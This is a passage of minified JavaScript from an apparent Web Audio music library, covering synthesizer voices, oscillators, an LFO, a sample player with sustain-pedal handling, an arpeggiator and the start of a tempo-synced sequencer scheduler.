a=this._arpVoices.slice(0);a.sort(this.sortVoices);var u=this._arpVoices.slice(0);u.sort(this.sortVoices),u.reverse(),this._arpVoices=a.concat(u),this._arpVoices.length>1&&(this._arpVoices.splice(this._arpVoices.length/2,1),this._arpVoices.pop())}else"random"===this._arpMode&&(this._arpVoices=U.shuffle(this._arpVoices))},e.prototype.sortVoices=function(t,e){return t.midiEvent.noteNumber<e.midiEvent.noteNumber?-1:t.midiEvent.noteNumber>e.midiEvent.noteNumber?1:0},e.prototype.arpActive=function(t){if(t){if(this._sync){var e=R.instance.findInstance(this._sync);e.registerSynth(this),e._started||e.start()}}else if(this._arpMode="off",this._sync){var e=R.instance.findInstance(this._sync);e.unregisterSynth(this)}},e.prototype.update=function(t,e){if(t%this._beatSubscription==0){if(this._arpPatternStep=4*t%this._arpPattern.length,0===this._arpVoices.length)return;if(this._arpPattern.length&&!this._arpPattern[4*t%this._arpPattern.length])return;if(this._arpCounter++,this._arpCounter=this._arpCounter%this._arpVoices.length,this._arpCounter<this._arpVoices.length){var i=this._fixedVelocities?this._fixedVelocities[this._arpCounter]:this._arpVoices[this._arpCounter].midiEvent.velocity;this._arpVoices[this._arpCounter].midiEvent.velocity=i,this.handleMidiEvent(this._arpVoices[this._arpCounter].midiEvent,e,this._arpVoices[this._arpCounter].transpose,!0);var n={type:"channel",subtype:"noteOff",noteNumber:this._arpVoices[this._arpCounter].midiEvent.noteNumber,velocity:this._arpVoices[this._arpCounter].midiEvent.velocity,deltaTime:this._arpVoices[this._arpCounter].midiEvent.deltaTime};this.handleMidiEvent(n,e+this._arpNoteLength,this._arpVoices[this._arpCounter].transpose,!0)}}},e.prototype.deschedule=function(){return t.warn("Synth: Invocation of abstract method: Synth.deschedule in",this),this},Object.defineProperty(e.prototype,"arpCounter",{get:function(){return this._arpCounter},enumerable:!0,configurable:!0}),Object.defineProperty(e.prototype,"arpLength",{get:function(){return this._arpVoices.length},enumerable:!0,configurable:!0}),Object.defineProperty(e.prototype,"output",{get:function(){return this._output},enumerable:!0,configurable:!0}),Object.defineProperty(e.prototype,"arpPattern",{get:function(){return this._arpPattern},set:function(t){this._arpPattern=t},enumerable:!0,configurable:!0}),Object.defineProperty(e.prototype,"arpPatternStep",{get:function(){return this._arpPatternStep},enumerable:!0,configurable:!0}),e.prototype.setData=function(t){if(void 0!=t.volume&&(this.output.gain.value=t.volume),this.destinationName!=t.destination_name&&(this.destinationName=t.destination_name,this.disconnect(),this.connect(R.instance.findInstance(this.destinationName).input)),t.arp){if(this._sync=t.arp.sync,this._octaves=t.arp.octaves,this._arpPattern=t.arp.arp_pattern,"off"==this._arpMode){var e=R.instance.findInstance(this._sync);e.registerSynth(this),e._started||e.start()}this._arpMode=t.arp.arp_mode}else if(this._arpMode="off",this._sync){var e=R.instance.findInstance(this._sync);e.unregisterSynth(this)}this.data=t},e}();e.Synth=N,e.generateNoiseBuffer=o;var L=function(){function e(e,i,n,s,o){this.filterStartFreq=-1,this._filterEnabled=!0,this.voiceType=i,this.active=!1,this.activatedNote=-1,this._enabled=!0,this._detune=e.detune||0,this._wave=e.wave||"sine",this._frames=e.frames,this._algorithm=e.algorithm,o&&(this._noiseBuffer=o),this.gain=t.context.createGain(),n||(n={frequency:22050,Q:1,filter_type:"lowpass"},this.filterEnabled=!1),this._filterData=n}return e.prototype.noteOn=function(e,i,n,s,o,r,a){if(this.enabled){if("custom"!==this._wave?(this.source=t.context.createOscillator(),this.source.type=this._wave,this.source.detune.value=this._detune):"custom"==this._wave&&(this.source=t.context.createBufferSource(),this.source.buffer=this._noiseBuffer,this.source.loop=!0),this._envelope=t.context.createGain(),this._filterData?(this.filter=t.context.createBiquadFilter(),this.filter.type=U.safeFilterType(this._filterData.filter_type),this.filter.frequency.value=void 0==this._filterData.frequency?U.NYQUIST_FREQUENCY:this._filterData.frequency,this.filter.detune&&(this.filter.detune.value=this._filterData.detune||0),this.filter.Q.value=this._filterData.Q||this.filter.Q,this.filter.gain.value=this._filterData.gain||this.filter.gain,this.filterTargetFreq=this.filter.frequency.value,this.source.connect(this.filter),this.filter.connect(this._envelope),this._envelope.connect(this.gain)):(this.source.connect(this._envelope),this._envelope.connect(this.gain)),1==this.voiceType&&this.filterAmplitudeGainNode.connect(this.filter.frequency),n<U.now()&&(n=U.now()),this.active=!0,this.activatedNote=e,"custom"!==this._wave){var u=U.midiNoteToFrequency(e+a);if(r){var c=-1;r.contour>0?c=u*(1-r.contour):r.contour<0&&(c=(U.NYQUIST_FREQUENCY-u)*-r.contour+u),this.source.frequency.cancelScheduledValues(n),-1!=c?(this.source.frequency.setValueAtTime(c,n),t.safari?this.source.frequency.setTargetValueAtTime(u,n,r.decay):this.source.frequency.setTargetAtTime(u,n,r.decay)):this.source.frequency.setValueAtTime(u,n)}else this.source.frequency.setValueAtTime(u,n)}o&&(this.filterStartFreq=-1,o.contour<0?this.filterStartFreq=this.filterTargetFreq*(1+o.contour)+1:o.contour>0&&(this.filterStartFreq=(U.NYQUIST_FREQUENCY-this.filterTargetFreq)*o.contour+this.filterTargetFreq),-1!=this.filterStartFreq&&(this.filter.frequency.cancelScheduledValues(n),this.filter.frequency.setValueAtTime(this.filterStartFreq,n),this.filter.frequency.exponentialRampToValueAtTime(this.filterTargetFreq,n+o.attack),t.safari?this.filter.frequency.setTargetValueAtTime(this.filterTargetFreq*o.sustain,n+o.attack,o.decay):this.filter.frequency.setTargetAtTime(this.filterTargetFreq*o.sustain,n+o.attack,o.decay)));var h;h="linear"===s.volumeCurve?i/128:"exponential"===s.volumeCurve?Math.abs(1-Math.exp(i/128)):1,s?(this._envelope.gain.setValueAtTime(0,n),this._envelope.gain.linearRampToValueAtTime(h,n+s.attack),t.safari?this._envelope.gain.setTargetValueAtTime(h*s.sustain,n+s.attack,s.decay):this._envelope.gain.setTargetAtTime(h*s.sustain,n+s.attack,s.decay)):this._envelope.gain.setValueAtTime(h,n),this.source.startTime=n,t.safari?this.source.noteOn(n):this.source.start(n)}},e.prototype.noteOff=function(e,i,n,s){if(this.enabled){if(i<U.now()&&(i=U.now()),this.active=!1,
s&&-1!=this.filterStartFreq){var o=this.filter.frequency.value;this.filter.frequency.cancelScheduledValues(i),this.filter.frequency.setValueAtTime(o,i),t.safari?this.filter.frequency.setTargetValueAtTime(this.filterStartFreq,i,s.release):this.filter.frequency.setTargetAtTime(this.filterStartFreq,i,s.release)}n?(this._envelope.gain.cancelScheduledValues(i),i!=U.now()?this._envelope.gain.setValueAtTime(n.sustain,i):this._envelope.gain.setValueAtTime(this._envelope.gain.value,i),t.safari?this._envelope.gain.setTargetValueAtTime(0,i,n.release):this._envelope.gain.setTargetAtTime(0,i,n.release)):this._envelope.gain.setValueAtTime(0,i),this.source.offTime=i,t.safari?this.source.noteOff(i+5*n.release):this.source.stop(i+5*n.release)}},e.prototype.stop=function(){this.filter.frequency.cancelScheduledValues(0),this._envelope.gain.cancelScheduledValues(0),this._envelope.gain.setValueAtTime(0,0),t.safari?this.source.noteOff(0):this.source.stop(0),this.source.disconnect(),this.filter&&this.filter.disconnect(),this._envelope&&this._envelope.disconnect()},e.prototype.stopSoft=function(e,i,n){this.active=!1,this._envelope.gain.cancelScheduledValues(e),t.safari?this._envelope.gain.setTargetValueAtTime(0,e,i.release):this._envelope.gain.setTargetAtTime(0,e,i.release);var s=e+5*i.release;t.safari?this.source.noteOff(s):this.source.stop(s);var o=this;setTimeout(function(){o.source.disconnect(),o.filter&&o.filter.disconnect(),o._envelope&&o._envelope.disconnect()},1e3*(s-U.now()))},Object.defineProperty(e.prototype,"enabled",{get:function(){return this._enabled},set:function(t){this._enabled=t},enumerable:!0,configurable:!0}),Object.defineProperty(e.prototype,"filterEnabled",{get:function(){return this._filterEnabled},set:function(t){this._filterEnabled=t,this.source&&(t?(this.source.disconnect(),this.source.connect(this.filter),this.filter.connect(this._envelope)):(this.source.disconnect(),this.filter.disconnect(),this.source.connect(this._envelope)))},enumerable:!0,configurable:!0}),e}(),j=function(){function e(e,i,n,s){this._enabled=!0,this.nextVoice=0,this.octave=e.octave||0,this.output=t.context.createGain(),this.output.gain.value=void 0==e.volume?1:e.volume,this._data=e,this._poly=i,this._filterData=n,this.voices=[],this._noiseBuffer=o(this._data._frames,this._data._algorithm)}return e.prototype.noteOn=function(t,e,i,n,s,o,r){if(this.enabled){this.voices.length==this._poly&&(this.voices[0].noteOff(t,i,n,s),this.voices.splice(0,1)),t+=12*this.octave;var a;a="custom"==this._data.wave?new L(this._data,0,this._filterData,i,this._noiseBuffer):new L(this._data,0,this._filterData,i,null),a.gain.connect(this.output),a.noteOn(t,e,i,n,s,o,r),this.lfoPitchGainNode&&"custom"!=this._data.wave&&this.lfoPitchGainNode.connect(a.source.frequency),this.filterAmplitude&&a.filter&&this.filterAmplitude.connect(a.filter.frequency),this.voices.push(a)}},e.prototype.noteOff=function(t,e,i,n){if(this.enabled){t+=12*this.octave;for(var s=0;s<this.voices.length;s++)if(this.voices[s].active&&this.voices[s].activatedNote==t){this.voices[s].noteOff(t,e,i,n),this.voices.splice(s,1);break}}},e.prototype.stopSoft=function(t,e,i){for(var n=0;n<this.voices.length;n++)this.voices[n].stopSoft(t,e,i);this.voices=[]},e.prototype.stop=function(){for(var t=0,e=this.voices.length;e>t;t++)this.voices[t].stop();this.voices=[]},e.prototype.deschedule=function(){for(var e=0,i=this.voices.length;i>e;e++)if(this.voices[e]){var n=this.voices[e].source;(1==n.playbackState||n.startTime>t.context.currentTime)&&(this.voices[e].stop(),this.voices.splice(e,1),e--)}},e.prototype.setDetune=function(t,e){if(this._data){this._data.detune=t;for(var i=0,n=this.voices.length;n>i;i++)this.voices[i].source.detune.setValueAtTime(t,e)}},Object.defineProperty(e.prototype,"enabled",{get:function(){return this._enabled},set:function(t){this._enabled=t},enumerable:!0,configurable:!0}),Object.defineProperty(e.prototype,"detune",{get:function(){return this._detune},enumerable:!0,configurable:!0}),e}(),q=function(){function e(e,i){this.osc=t.context.createOscillator(),this.phaseDelay=t.context.createDelay(),this.osc.type=e.wave||"sine",this.osc.frequency.value=e.rate||1,this.phase=e.phase||0,this.phaseDelay.delayTime.value=this.phase*(1/this.osc.frequency.value),this.sync=e.sync,this.syncResolution=e.rate,this.osc.connect(this.phaseDelay),this.oscVolumeAmplitude=t.context.createGain(),this.oscVolumeAmplitude.gain.value=e.osc_volume_amount,this.phaseDelay.connect(this.oscVolumeAmplitude),this.pitchAmplitude=t.context.createGain(),this.pitchAmplitude.gain.value=e.pitch_amount,this.phaseDelay.connect(this.pitchAmplitude),this.filterAmplitude=t.context.createGain(),this.filterAmplitude.gain.value=e.filter_amount,this.phaseDelay.connect(this.filterAmplitude),t.safari?this.osc.noteOn(i):this.osc.start(i)}return e.prototype.updateSync=function(t){return this.osc.frequency.value=t/60/this.syncResolution,this.phaseDelay.delayTime.value=this.phase*(1/this.osc.frequency.value),this},e}(),G=function(e){function i(i,n){e.call(this,i,n),this.bendRange=400;var s=t.context.currentTime+U.OSC_START_DELAY;this._gainEG=i.gain_eg,this._filterEG=i.filter_eg,this._pitchEG=i.pitch_eg;var o=0;i.oscillators[0]||(i.oscillators.push({wave:"sine",detune:0,volume:1,octave:0}),o++),i.oscillators[1]||(i.oscillators.push({wave:"sine",detune:0,volume:1,octave:0}),o++),this._oscs=[],this._poly=i.poly;for(var r=0,a=i.oscillators.length;a>r;r++){var u=new j(i.oscillators[r],i.poly,i.filter,s);u.output.connect(this.output),this._oscs.push(u)}if(1==o?this._oscs[1].enabled=!1:2==o&&(this._oscs[0].enabled=!1,this._oscs[1].enabled=!1),i.LFO||(i.LFO={wave:"sine",rate:1,phase:0,osc_volume_amount:0,noise_volume_amount:0,pitch_amount:0,filter_amount:0}),i.LFO){this._LFO=new q(i.LFO,s);for(var r=0,a=this._oscs.length;a>r;r++){var c=this._oscs[r];this._LFO.oscVolumeAmplitude&&this._LFO.oscVolumeAmplitude.connect(c.output.gain),this._LFO.pitchAmplitude&&(c.lfoPitchGainNode=this._LFO.pitchAmplitude),this._LFO.filterAmplitude&&(c.filterAmplitude=this._LFO.filterAmplitude)}this._LFO.sync&&R.instance.pushToPreLoadInitStack(this)}this._sync&&R.instance.pushToPreLoadInitStack(this)}return s(i,e),i.prototype.init=function(){if(this._LFO&&this._LFO.sync){var t=R.instance.findInstance(this._LFO.sync);this._LFO.updateSync(t.bpm),t.registerBPMSync(this._LFO)}if(this._sync){var t=R.instance.findInstance(this._sync);t.registerSynth(this),t.started||t.start()}},i.prototype.handleMidiEvent=function(e,i,n,s){if(console.log("HERE?"),i=i||t.context.currentTime,s=s||!1,n=n||0,"channel"==e.type)if("noteOn"==e.subtype){if("off"!=this._arpMode&&!s)return this._activeVoices.push({midiEvent:e,transpose:n}),void this.handleArpModes(e);for(var o=0,r=this._oscs.length;r>o;o++)this._oscs[o].noteOn(e.noteNumber,e.velocity,i,this._gainEG,this._filterEG,this._pitchEG,n)}else if("noteOff"==e.subtype){if("off"!=this._arpMode&&!s){for(var a=0;a<this._activeVoices.length;a++)e.noteNumber===this._activeVoices[a].midiEvent.noteNumber&&this._activeVoices.splice(a,1);return void this.handleArpModes(e)}for(var o=0,r=this._oscs.length;r>o;o++)this._oscs[o].noteOff(e.noteNumber,i,this._gainEG,this._filterEG)}else if("pitchBend"==e.subtype){var u;void 0!=e.value?u=e.value:void 0!=e.velocity&&(u=e.velocity);for(var c=(u-8192)/16384*this.bendRange,a=0;a<this._oscs.length;a++)this._oscs[a].setDetune(c,i)}return this},i.prototype.glideTo=function(t,e,i,n){var s=U.now();e=e||s,void 0==i&&(i=.5),n=n||0;for(var o=0,r=this._oscs.length;r>o;o++)for(var a=this._oscs[o],u=Math.min(t.length,a.voices.length),c=0;u>c;c++){var h=a.voices[c],l=U.midiNoteToFrequency(t[c]+n+12*a.octave);h.source.frequency&&(h.source.frequency.cancelScheduledValues(s),h.source.frequency.setValueAtTime(h.source.frequency.value,e),h.source.frequency.linearRampToValueAtTime(l,e+i))}return this},i.prototype.stop=function(t){t=t||U.now();for(var e=0,i=this._oscs.length;i>e;e++)this._oscs[e].stopSoft(t,this._gainEG,this._filterEG);this._activeVoices.length&&(this._activeVoices=[]),this._arpVoices=[]},i.prototype.deschedule=function(){for(var t=0,e=this._oscs.length;e>t;t++)this._oscs[t].deschedule();return this},Object.defineProperty(i.prototype,"filterFrequency",{set:function(t){for(var e=0,i=this._oscs.length;i>e;e++){var n=this._oscs[e];n._filterData.frequency=t;for(var s=0,o=n.voices.length;o>s;s++){var r=n.voices[s];r.filterTargetFreq=t,this._filterEG&&0!=this._filterEG.contour||(r.filter.frequency.value=t)}}},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"filterQ",{set:function(t){for(var e=0,i=this._oscs.length;i>e;e++){var n=this._oscs[e];n._filterData.Q=t;for(var s=0,o=n.voices.length;o>s;s++){var r=n.voices[s];r.filterTargetFreq=t,this._filterEG&&0!=this._filterEG.contour||(r.filter.Q.value=t)}}},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"filterType",{set:function(t){for(var e=0,i=this._oscs.length;i>e;e++){var n=this._oscs[e];n._filterData.filter_type=t;for(var s=0,o=n.voices.length;o>s;s++){var r=n.voices[s];r.filter.type=t}}},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"osc1Wave",{set:function(t){var e=this._oscs[0];e._data.wave=t;for(var i=0,n=e.voices.length;n>i;i++){var s=e.voices[i];s.source.type&&"4"!==t&&(s.source.type=t)}},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"osc1Vol",{set:function(t){var e=this._oscs[0];e.output.gain.value=t},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"osc1Detune",{set:function(t){var e=this._oscs[0];e._detune=t;for(var i=0,n=e.voices.length;n>i;i++){var s=e.voices[i];s.source.detune&&(s.source.detune.value=t)}},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"osc1Octave",{set:function(t){var e=this._oscs[0];e.octave=t},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"osc2Wave",{set:function(t){if(!(this._oscs.length<2)){var e=this._oscs[1];e._data.wave=t;for(var i=0,n=e.voices.length;n>i;i++){var s=e.voices[i];s.source.type&&"4"!==t&&(s.source.type=t)}}},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"osc2Vol",{set:function(t){if(!(this._oscs.length<2)){var e=this._oscs[1];e.output.gain.value=t}},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"osc2Detune",{set:function(t){if(!(this._oscs.length<2)){var e=this._oscs[1];e._detune=t;for(var i=0,n=e.voices.length;n>i;i++){var s=e.voices[i];s.source.detune&&(s.source.detune.value=t)}}},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"osc2Octave",{set:function(t){if(!(this._oscs.length<2)){var e=this._oscs[1];e.octave=t}},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"pitchDecay",{set:function(t){this._pitchEG&&(this._pitchEG.decay=t)},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"pitchContour",{set:function(t){this._pitchEG&&(this._pitchEG.contour=t)},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"lfoWave",{set:function(t){this._LFO&&(this._LFO.osc.type=t)},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"lfoRate",{set:function(t){this._LFO&&(this._LFO.osc.frequency.value=t)},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"lfoPhase",{set:function(t){this._LFO&&(this._LFO.phase=t)},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"lfoOscVol",{set:function(t){this._LFO&&(this._LFO.oscVolumeAmplitude.gain.value=t)},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"lfoPitch",{set:function(t){this._LFO&&(this._LFO.pitchAmplitude.gain.value=t)},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"lfoFilter",{set:function(t){this._LFO&&(this._LFO.filterAmplitude.gain.value=t)},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"arpMode",{set:function(t){this._arpMode=t},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"arpOctaves",{set:function(t){this._octaves=t},enumerable:!0,configurable:!0}),i.prototype.setData=function(t){e.prototype.setData.call(this,t),this._poly=t.poly,this._gainEG=t.gain_eg?t.gain_eg:void 0,this._filterEG=t.filter_eg?t.filter_eg:void 0,this._pitchEG=t.pitch_eg?t.pitch_eg:void 0,this._oscs[0].enabled=t.oscillators[0]?!0:!1,this._oscs[1].enabled=t.oscillators[1]?!0:!1;for(var i=0,n=this._oscs.length;n>i;i++){var s=this._oscs[i];s._data=t.oscillators[i],s._filterData=t.filter,s._poly=this._poly;for(var o=0,r=s.voices.length;r>o;o++){var a=s.voices[o];t.filter?(a.filterEnabled||(a.filterEnabled=!0),this._filterEG&&0!=this._filterEG.contour||(a.filter.frequency.value=t.filter.frequency),a.filter.Q.value=t.filter.Q,a.filterTargetFreq=t.filter.frequency,a.filter.type=t.filter.filter_type):a.filterEnabled&&(a.filterEnabled=!1),t.oscillators&&t.oscillators[i]&&0==a.voiceType&&(a.source.type&&4!==t.oscillators[0].wave&&(a.source.type=t.oscillators[i].wave),a.source.detune&&(a.source.detune.value=t.oscillators[i].detune))}t.oscillators[i]&&(s.output.gain.value=t.oscillators[i].volume,s.octave=t.oscillators[i].octave)}t.LFO?(this._LFO.osc.type=t.LFO.wave,this._LFO.osc.frequency.value=t.LFO.rate,this._LFO.phase=t.LFO.phase,this._LFO.phaseDelay.delayTime.value=t.LFO.phase*(1/this._LFO.osc.frequency.value),this._LFO.oscVolumeAmplitude.gain.value=t.LFO.osc_volume_amount,this._LFO.pitchAmplitude.gain.value=t.LFO.pitch_amount,this._LFO.filterAmplitude.gain.value=t.LFO.filter_amount):(this._LFO.oscVolumeAmplitude.gain.value=0,this._LFO.pitchAmplitude.gain.value=0,this._LFO.filterAmplitude.gain.value=0)},i}(N);e.Symple=G;var B=function(e){function i(t,i){e.call(this,t,i),this._content=[],this._playingVoices=[],this._allVoices=[],this._hasNoteOffSamples=!1,this._hasSustainOnSamples=!1,this._hasSustainOffSamples=!1,this._pitchBendRange=.25,this._pedalOnTime=-1,this._sustained=[],this._maxNotes=20,this._stopFactor=5,this._content=t.content,this._volumeCurve=t.volume_curve||"none",this._gainEG=t.eg_gain||{attack:0,decay:0,sustain:1,release:.005},this._currentPitch=1,R.instance.pushToPreLoadInitStack(this)}return s(i,e),i.prototype.init=function(){this._envelope=t.context.createGain();for(var e=0,i=this._content.length;i>e;e++){"noteOff"===this._content[e].value&&(this._hasNoteOffSamples=!0),"sustainOn"===this._content[e].value&&(this._hasSustainOnSamples=!0),"sustainOff"===this._content[e].value&&(this._hasSustainOffSamples=!0);for(var n=0;n<this._content[e].samples.length;n++)this._content[e].samples[n].source=R.instance.findInstance(this._content[e].samples[n].source),this._content[e].samples[n].source||t.warn("SamplePlayer: audio source not found"),this._content[e].samples[n].source._parentType="SamplePlayer",this._content[e].samples[n].source.loop&&(this._loopedSamples=!0)}if(this._sync){var s=R.instance.findInstance(this._sync);s.registerSynth(this),!s.started}},i.prototype.handleMidiEvent=function(t,e,i,n){if(e=e||U.now(),n=n||!1,i=i||0,"channel"==t.type)if("noteOn"==t.subtype){if("off"!=this._arpMode&&!n)return this._activeVoices.push({midiEvent:t,transpose:i}),void this.handleArpModes(t);this.noteOn(e,t.noteNumber,i,t.velocity,t.subtype),this._callback&&this._callback(t,e)}else if("noteOff"==t.subtype){if("off"!=this._arpMode&&!n){for(var s=0;s<this._activeVoices.length;s++)t.noteNumber===this._activeVoices[s].midiEvent.noteNumber&&this._activeVoices.splice(s,1);return void this.handleArpModes(t)}this.noteOff(e,t.noteNumber,t.velocity,t.subtype),this._callback&&this._callback(t,e)}else if("pitchBend"==t.subtype){var o=t.value;this._currentPitch=1+(o-64)/127;for(var s=0;s<this._playingVoices.length;s++)this._playingVoices[s].source.playbackRateNode.setValueAtTime(this._currentPitch,e)}else if("controller"==t.subtype){var r=t.controllerType||t.noteNumber,a=void 0==t.value?t.velocity:t.value;switch(r){case 1:break;case 64:64>a?(this.pedalRelease(e),e>this._pedalOnTime&&(this._pedalOnTime=-1),this._hasSustainOffSamples&&this.noteOn(e,0,0,127,"sustainOff")):a>64&&(this._pedalOnTime=e,this._hasSustainOnSamples&&this.noteOn(e,0,0,127,"sustainOn"))}}return this},i.prototype.noteOn=function(t,e,i,n,s,o){for(var r=0;r<this._allVoices.length;r++){var a=this._allVoices[r];(0==a.source._sources.length||3==a.source.lastSource.playbackState)&&(this._allVoices.splice(r,1),r--)}var u=this.getNote(e+i,n,s),h=U.midiNoteToFrequency(e+i),l=U.midiNoteToFrequency(u.root),p=h/l;-1===u.root&&(p=1);var _=new c(u.source.data,e.toString());if("noteOn"===s){var f={source:_,time:t,velocity:n,note:e,transpose:i};this._playingVoices.push(f),this._allVoices.push(f)}this.destinationName?_.connect(R.instance.findInstance(this.destinationName).input):_.connect(R.instance.findInstance(_.destinationName).input),t=t<U.now()?U.now():t;var d=0;o?d=o*n/128:"linear"===this._volumeCurve?d=n/128:"exponential"===this._volumeCurve?d=Math.abs(1-Math.exp(n/128)):"none"===this._volumeCurve&&(d=1),d*=_.output.gain.value,_.output.gain.cancelScheduledValues(t),_.nextPlaybackRate=p*this._currentPitch,_.play(t),_.output.gain.setValueAtTime(0,t),_.output.gain.linearRampToValueAtTime(d,t+this._gainEG.attack),_.output.gain.setTargetAtTime?_.output.gain.setTargetAtTime(d*this._gainEG.sustain,t+this._gainEG.attack,this._gainEG.decay):_.output.gain.setTargetValueAtTime&&_.output.gain.setTargetValueAtTime(d*this._gainEG.sustain,t+this._gainEG.attack,this._gainEG.decay)},i.prototype.adsr=function(t,e,i,n){var s=this._gainEG;return 0===arguments.length?{attack:s.attack,decay:s.decay,sustain:s.sustain,release:s.release}:(s.attack=void 0===arguments[0]?s.attack:arguments[0],s.decay=void 0===arguments[1]?s.decay:arguments[1],s.sustain=void 0===arguments[2]?s.sustain:arguments[2],s.release=void 0===arguments[3]?s.release:arguments[3],this)},i.prototype.noteOff=function(e,i,n,s){for(var o=(this.getNote(i,n,"noteOn"),0);o<this._playingVoices.length;o++)if(!i||i.toString()===this._playingVoices[o].source._name)if(e>this._pedalOnTime&&this._pedalOnTime>0)this._sustained.length>this._maxNotes&&(this._sustained[0].source.stop(e+this._gainEG.release*this._stopFactor),this._sustained.splice(0,1)),this._sustained.push(this._playingVoices[o]),this._playingVoices.splice(o,1);else{e<U.now()&&(e=U.now());var r=this._playingVoices[o].source.output.gain.value;if(this._playingVoices[o].source.output.gain.cancelScheduledValues(e),e!=U.now()||"Firefox"==t.detector.browser.name?this._playingVoices[o].source.output.gain.setValueAtTime(this._gainEG.sustain,e):this._playingVoices[o].source.output.gain.setValueAtTime(r,e),this._playingVoices[o].source.stop(e+this._gainEG.release*this._stopFactor),this._playingVoices[o].source.output.gain.setTargetAtTime(0,e,this._gainEG.release),this._hasNoteOffSamples){var a=U.now()-this._playingVoices[o].time,u=Math.min(Math.exp(-a)/3,1);this.noteOn(e,i,this._playingVoices[o].transpose,this._playingVoices[o].velocity,s,u)}this._playingVoices.splice(o,1)}},i.prototype.stop=function(t){var t=t||U.now();this.pedalRelease(t);for(var e=0;e<this._playingVoices.length;e++){t<U.now()&&(t=U.now());var i=this._playingVoices[e].source.output.gain.value;this._playingVoices[e].source.output.gain.cancelScheduledValues(t),this._playingVoices[e].source.output.gain.setValueAtTime(i,t),this._playingVoices[e].source.stop(t+this._gainEG.release*this._stopFactor),this._playingVoices[e].source.output.gain.setTargetAtTime(0,t,this._gainEG.release)}return this._playingVoices=[],this._arpVoices=[],this},i.prototype.deschedule=function(){for(var t=0;t<this._allVoices.length;t++)this._allVoices[t].source.deschedule();return this},i.prototype.pedalRelease=function(e){for(var i=0;i<this._sustained.length;i++)if(e<U.now()&&(e=U.now()),"Firefox"!=t.detector.browser.name){if(this._sustained[i].source.output.gain.setTargetAtTime(0,e,this._gainEG.release),this._hasNoteOffSamples){var n=U.now()-this._sustained[i].time,s=Math.min(Math.exp(-n)/3,1);this.noteOn(e,this._sustained[i].note,this._sustained[i].transpose,this._sustained[i].velocity,"noteOff",s)}}else this._sustained[i].source.output.gain.linearRampToValueAtTime(0,e+.3),this._sustained[i].source.stop(e+this._gainEG.release*this._stopFactor);this._sustained=[]},i.prototype.getNote=function(t,e,i){var n=0;for(this._content[n].value||"noteOn";e>this._content[n].highVelocity||i!==this._content[n].value;)n++;for(var s=n,o=0;t<this._content[s].samples[o].startRange||t>this._content[s].samples[o].endRange;)o++;return this._content[s].samples[o]},Object.defineProperty(i.prototype,"content",{get:function(){return this._content},set:function(t){this._content=t,this.init()},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"callbackFunction",{set:function(t){this._callback=t},enumerable:!0,configurable:!0}),i.prototype.setData=function(t){e.prototype.setData.call(this,t),t.eg_gain&&(this._gainEG=t.eg_gain),t.content&&(this._content=t.content,this.init()),t.volumeCurve&&(this._volumeCurve=t.volumeCurve)},i}(N);e.SamplePlayer=B;(function(){function t(){throw"Smattr not up to date, fix if(safari)"}return t})();!function(t){t._map=[],t._map[0]="Restart",t.Restart=0,t._map[1]="Playing",t.Playing=1,t._map[2]="All",t.All=2,t._map[3]="Continue",t.Continue=3}(e.SyncType||(e.SyncType={}));var H=e.SyncType,Q=function(e){function i(t,i){e.call(this),this._scheduler=null,this._started=!1,this._bpm=120,this._barLength=4,this._beatLength=1,this._resolution=.25,this._currentStep=0,this._paused=!1,this._maxSwing=.08,this._swingFactor=0,this._lastBeat=-1,this._name=i,this._type=t.type,this._bpm=t.bpm||120,this._barLength=t.bar_length||4,this._beatLength=t.beat_length||1,this._registeredPatterns=[],this._registeredSynths=[],this._syncHandler=new K,this._syncedObjects=[],this._swingFactor=t.swing_factor||0,R.instance.pushToPreLoadInitStack(this)}return s(i,e),i.prototype.init=function(){this._lookahead=R.settings.sequencer_lookahead||50,this._scheduleAheadTime=R.settings.sequencer_schedule_ahead||.2,t.isIOS&&(this._scheduleAheadTime=R.settings.sequencer_schedule_ahead_ios||5),this._resolution=R.settings.sequencer_resolution||.25},i.prototype.startScheduler=function(){if(!this._paused&&0!==t.context.currentTime){for(this._lastScheduleLoopTime=t.context.currentTime;this._scheduleTime<t.context.currentTime+this._scheduleAheadTime;){for(var e=0,i=this._registeredPatterns.length;i>e;e++)this._registeredPatterns[e].update(this._currentStep,this._scheduleTime);for(var n=0,i=this._registeredSynths.length;i>n;n++)this._registeredSynths[n].update(this._currentStep,this._scheduleTime);this._currentStep+=this._resolution,this._syncHandler.update(this._resolution),this._swingFactor>0?4*this._currentStep%2?this._scheduleTime+=(.25+this._maxSwing*this._swingFactor)*(60/this._bpm):this._scheduleTime+=(.25-this._maxSwing*this._swingFactor)*(60/this._bpm):this._scheduleTime+=60/this._bpm*this._resolution}var s=this.currentStep,o=Math.floor(s),r=t.context.currentTime;o!==this._lastBeat&&(this.trigger("beforeNextBeat",o,this.getBeatTime(0)-r,r),this._lastBeat=o),this.trigger("progress",this._currentStep,this.getBeatTime(0)-r,this._scheduleTime)}var a=this;this._scheduler=setTimeout(function(){a.startScheduler()},a._lookahead)},i.prototype.start=function(){return this._started=!0,this._scheduleTime=t.context.currentTime,this._scheduleAheadTime<=.2&&(this._scheduleTime+=.3),clearTimeout(this._scheduler),this.startScheduler(),R.callbacks&&R.callbacks.startSequencer&&R.callbacks.startSequencer({name:this._name}),this.trigger("start"),this},i.prototype.pause=function(){this._paused=!0,this._pauseOffset=this._scheduleTime-U.now();for(var 